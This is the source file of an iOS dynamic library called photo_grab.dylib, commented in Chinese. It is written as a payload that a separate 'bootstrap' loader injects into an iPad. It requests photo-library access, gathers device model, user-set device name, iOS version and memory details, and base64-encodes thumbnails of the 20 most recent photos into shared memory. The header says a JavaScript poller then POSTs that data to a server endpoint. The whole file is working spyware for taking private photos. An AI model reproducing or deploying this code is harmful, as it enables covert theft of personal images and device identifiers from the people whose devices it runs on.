/**
 * photo_grab.dylib — iPad 照片采集模块
 * ========================================
 *
 * 编译（需要 macOS + Xcode）:
 *   xcrun --sdk iphoneos clang -arch arm64 -dynamiclib \
 *     -mios-version-min=14.0 \
 *     -framework Foundation -framework Photos -framework UIKit -framework IOKit \
 *     -o photo_grab.dylib photo_grab.c
 *
 * 部署:
 *   把 photo_grab.dylib 放到 payloads/ 目录
 *
 * 工作原理:
 *   bootstrap.dylib 通过 dlopen(RTLD_DEFAULT) 加载本 dylib
 *   然后 dlsym("_process") → 调用 _process(shared_buffer)
 *   _process 遍历照片库 → JSON 写入共享内存 → 设 state=BA
 *   JS 侧 wA() 轮询到 state=BA → 读数据 → POST /api/device-data
 *
 * 共享内存布局:
 *   +0x00  uint32_t  state (3=BA=数据就绪)
 *   +0x04  uint32_t  data_length
 *   +0x08  char[]    JSON 数据
 */

#include <Foundation/Foundation.h>
#include <Photos/Photos.h>
#include <UIKit/UIKit.h>
#include <IOKit/IOKitLib.h>
#include <sys/sysctl.h>
#include <stdint.h>
#include <string.h>

#define STATE_READY  3
#define MAX_OUTPUT   (8 * 1024 * 1024)
#define THUMB_SIZE   200
#define JPEG_QUALITY 0.35f
#define MAX_PHOTOS   20

// ── 写入共享内存 ──────────────────────────────────────────────────
static void write_buffer(uint32_t *buf, const char *json, size_t len) {
    if (len > MAX_OUTPUT - 8) len = MAX_OUTPUT - 8;
    memcpy((uint8_t *)buf + 8, json, len);
    buf[1] = (uint32_t)len;
    buf[0] = STATE_READY;
}

// ── 设备型号 ───────────────────────────────────────────────────────
static NSString *hw_machine(void) {
    size_t sz; sysctlbyname("hw.machine", NULL, &sz, NULL, 0);
    char *m = malloc(sz); sysctlbyname("hw.machine", m, &sz, NULL, 0);
    return [[NSString alloc] initWithBytesNoCopy:m length:sz - 1
        encoding:NSUTF8StringEncoding freeWhenDone:YES];
}

// ── 内存大小（GB） ─────────────────────────────────────────────────
static NSString *hw_memsize(void) {
    uint64_t mem = 0; size_t sz = sizeof(mem);
    sysctlbyname("hw.memsize", &mem, &sz, NULL, 0);
    return [NSString stringWithFormat:@"%.1f GB", (double)mem / 1073741824.0];
}

// ── Base64 ─────────────────────────────────────────────────────────
static NSString *b64(NSData *d) { return [d base64EncodedStringWithOptions:0]; }

// ── JSON 字符串转义 ────────────────────────────────────────────────
static NSString *json_esc(NSString *s) {
    if (!s) return @"";
    NSData *d = [NSJSONSerialization dataWithJSONObject:@[s] options:0 error:nil];
    if (!d) return s;
    NSString *r = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    if (r.length < 4) return s;
    return [r substringWithRange:NSMakeRange(2, r.length - 4)];
}

// ── 主入口 ─────────────────────────────────────────────────────────
__attribute__((visibility("default")))
void _process(uint32_t *shared) {
    @autoreleasepool {
        // ═══ 1. 权限 ═══════════════════════════════════════════════
        __block PHAuthorizationStatus auth = PHAuthorizationStatusNotDetermined;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        [PHPhotoLibrary requestAuthorizationForAccessLevel:PHAccessLevelReadWrite
            handler:^(PHAuthorizationStatus s) {
                auth = s; dispatch_semaphore_signal(sem);
            }];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 15ULL * NSEC_PER_SEC));

        if (auth != PHAuthorizationStatusAuthorized &&
            auth != PHAuthorizationStatusLimited) {
            write_buffer(shared, "{\"error\":\"permission_denied\"}", 29);
            return;
        }

        // ═══ 2. 设备信息 ═══════════════════════════════════════════
        NSString *model  = hw_machine();
        NSString *name   = [[UIDevice currentDevice] name];
        NSString *ios    = [[UIDevice currentDevice] systemVersion];
        NSString *memsz  = hw_memsize();
        NSProcessInfo *pi = [NSProcessInfo processInfo];

        NSMutableString *json = [NSMutableString stringWithFormat:
            @"{\"status\":\"ok\",\"device\":\"%@\",\"name\":\"%@\",\"ios\":\"%@\","
            @"\"ram\":\"%@\",\"cores\":%lu,\"activeProcessorCount\":%lu,\"photos\":[",
            json_esc(model), json_esc(name), ios, memsz,
            (unsigned long)pi.processorCount,
            (unsigned long)pi.activeProcessorCount];

        // ═══ 3. 遍历照片（用 semaphore 同步每张） ══════════════════
        PHFetchOptions *opt = [[PHFetchOptions alloc] init];
        opt.sortDescriptors = @[
            [NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
        opt.fetchLimit = MAX_PHOTOS;

        PHFetchResult<PHAsset *> *assets =
            [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:opt];

        PHImageRequestOptions *req = [[PHImageRequestOptions alloc] init];
        req.synchronous = YES;        // 阻塞等待，简化控制流
        req.deliveryMode = PHImageRequestOptionsDeliveryModeFastFormat;
        req.resizeMode   = PHImageRequestOptionsResizeModeExact;

        dispatch_semaphore_t imgSem = dispatch_semaphore_create(0);
        __block NSUInteger count = 0;

        for (PHAsset *asset in assets) {
            if (json.length > MAX_OUTPUT - 4096) break;

            [[PHImageManager defaultManager]
                requestImageForAsset:asset
                targetSize:CGSizeMake(THUMB_SIZE, THUMB_SIZE)
                contentMode:PHImageContentModeAspectFill
                options:req
                resultHandler:^(UIImage *img, NSDictionary *info) {
                    if (img) {
                        NSData *jpeg = UIImageJPEGRepresentation(img, JPEG_QUALITY);
                        if (jpeg) {
                            @synchronized (json) {
                                if (count > 0) [json appendString:@","];
                                // 包含缩略图 base64（限 40KB 内才发）
                                NSString *b64img = @"";
                                if (jpeg.length < 40000) {
                                    b64img = [NSString stringWithFormat:@"\"thumb\":\"data:image/jpeg;base64,%@\",",
                                        b64(jpeg)];
                                }
                                [json appendFormat:@"{\"w\":%.0f,\"h\":%.0f,"
                                    "\"date\":\"%@\",\"type\":\"%@\","
                                    "%@\"size\":%lu}",
                                    img.size.width, img.size.height,
                                    json_esc([asset.creationDate description]),
                                    json_esc(asset.mediaType == PHAssetMediaTypeImage ? @"image" : @"unknown"),
                                    b64img,
                                    (unsigned long)jpeg.length];
                                count++;
                            }
                        }
                    }
                    dispatch_semaphore_signal(imgSem);
                }];

            // 每张图等最多 5 秒
            dispatch_semaphore_wait(imgSem,
                dispatch_time(DISPATCH_TIME_NOW, 5ULL * NSEC_PER_SEC));
        }

        [json appendString:@"]}"];

        // ═══ 4. 写入共享内存 ═══════════════════════════════════════
        const char *cstr = [json UTF8String];
        write_buffer(shared, cstr, strlen(cstr));
    }
}
